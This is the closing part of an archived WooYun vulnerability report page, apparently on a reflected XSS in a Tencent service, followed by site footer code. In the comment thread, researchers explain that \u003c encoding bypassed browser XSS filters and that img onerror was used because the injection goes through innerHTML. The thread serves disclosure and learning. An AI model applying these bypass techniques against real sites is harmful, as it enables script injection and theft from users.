+	2012-10-08 03:19 | 蟋蟀哥哥( 普通白帽子 | Rank:329 漏洞数:52 | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)
+</p>
+<p style="text-indent:2em;">
+	尝试了一下。不知道为什么我的javascript为什么没有运行。难道是因为我用的&lt;scrtip&gt;的形式导致主流浏览器拦截了xss??我这只收到了一个ie6发来的请求。。@Jannock 不知道你做过这个的浏览器兼容性测试没有
+</p>
+<p style="text-indent:2em;">
+	37#
+</p>
+<p style="text-indent:2em;">
+	2012-10-08 08:32 | Jannock (核心白帽子 | Rank:1180 漏洞数:102 | 关注技术与网络安全)
+</p>
+<p style="text-indent:2em;">
+	@蟋蟀哥哥 你可以看到这个反射型XSS，\u003c编码绕过了主流浏览器拦截。
+</p>
+<p style="text-indent:2em;">
+	38#
+</p>
+<p style="text-indent:2em;">
+	2012-10-08 10:24 | 蟋蟀哥哥( 普通白帽子 | Rank:329 漏洞数:52 | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)
+</p>
+<p style="text-indent:2em;">
+	@Jannock 多谢。
+</p>
+<p style="text-indent:2em;">
+	39#
+</p>
+<p style="text-indent:2em;">
+	2012-10-08 11:05 | unic02n ( 普通白帽子 | Rank:63 漏洞数:6 | 我是来学习的！)
+</p>
+<p style="text-indent:2em;">
+	这种关于架构的缺陷多的是，这就是前期不重视，而后期只能将错就错继续错下去的后果。造成后期的修复手段单一，只能是缝缝补补，不能从根本上解决此类问题。还有很多网站，也是如此。即便有时候认识到这个问题，但是开发和领导们也未必有魄力或者足够的认识去解决这个问题，安全在开发初期的介入是相当有必要的。
+</p>
+<p style="text-indent:2em;">
+	40#
+</p>
+<p style="text-indent:2em;">
+	2012-10-08 11:05 | 蟋蟀哥哥( 普通白帽子 | Rank:329 漏洞数:52 | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)
+</p>
+<p style="text-indent:2em;">
+	@Jannock 你的那个iframe里面用了img scr。是你的漏洞必须还是其他原因?能否把iframe代码文字性发下。。多谢
+</p>
+<p style="text-indent:2em;">
+	41#
+</p>
+<p style="text-indent:2em;">
+	2012-10-08 11:24 | Jannock (核心白帽子 | Rank:1180 漏洞数:102 | 关注技术与网络安全)
+</p>
+<p style="text-indent:2em;">
+	@蟋蟀哥哥 就是这个反射xss是能过 innerHTML 形式注入的，所以使用 img onerror事件来执行脚本。。不能直接 &lt;script
+</p>
+<p style="text-indent:2em;">
+	42#
+</p>
+<p style="text-indent:2em;">
+	2012-10-08 11:26 | 蟋蟀哥哥( 普通白帽子 | Rank:329 漏洞数:52 | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)
+</p>
+<p style="text-indent:2em;">
+	@Jannock 谢谢。。怪不得我这测试有问题。。继续测试去了
+</p>
+<p style="text-indent:2em;">
+	43#
+</p>
+<p style="text-indent:2em;">
+	2012-12-12 11:20 | 偶尔透透气( 实习白帽子 | Rank:6 漏洞数:1 | 常常潜潜水,偶尔透透气.)
+</p>
+<p style="text-indent:2em;">
+	漏洞证明太亮了
+</p>
+<p style="text-indent:2em;">
+	44#
+</p>
+<p style="text-indent:2em;">
+	转自：<a href="http://www.wooyun.org/bugs/wooyun-2010-011192" target="_blank">http://www.wooyun.org/bugs/wooyun-2010-011192</a>
+</p>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Jannock</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2012-12-17
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/%E8%84%9A%E6%9C%AC/">脚本</a>
+          <a href="https://lcx.cc/tags/%E8%B7%A8%E7%AB%99/">跨站</a>
+          <a href="https://lcx.cc/tags/%E8%85%BE%E8%AE%AF/">腾讯</a>
+          <a href="https://lcx.cc/tags/cgi/">CGI</a>
+          <a href="https://lcx.cc/tags/cookie/">cookie</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/qq/">QQ</a>
+          <a href="https://lcx.cc/tags/xss/">XSS</a>
+          <a href="https://lcx.cc/tags/%E5%AE%89%E5%85%A8/">安全</a>
+          <a href="https://lcx.cc/tags/%E6%B5%8B%E8%AF%95/">测试</a>
+          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
+          <a href="https://lcx.cc/tags/%E5%B7%A5%E5%85%B7/">工具</a>
+          <a href="https://lcx.cc/tags/%E6%8A%80%E6%9C%AF/">技术</a>
+          <a href="https://lcx.cc/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/">浏览器</a>
+          <a href="https://lcx.cc/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+          <a href="https://lcx.cc/tags/%E7%BD%91%E7%BB%9C/">网络</a>
+          <a href="https://lcx.cc/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+          <a href="https://lcx.cc/tags/%E5%BE%AE%E5%8D%9A/">微博</a>
+          <a href="https://lcx.cc/tags/%E9%97%AE%E9%A2%98/">问题</a>
+          <a href="https://lcx.cc/tags/%E4%B9%8C%E4%BA%91/">乌云</a>
+          <a href="https://lcx.cc/tags/%E4%BA%91/">云</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/3165/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">flash_xss挖掘小谈</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/3163/">
+            <span class="next-text nav-default">漫谈反射xss利用</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
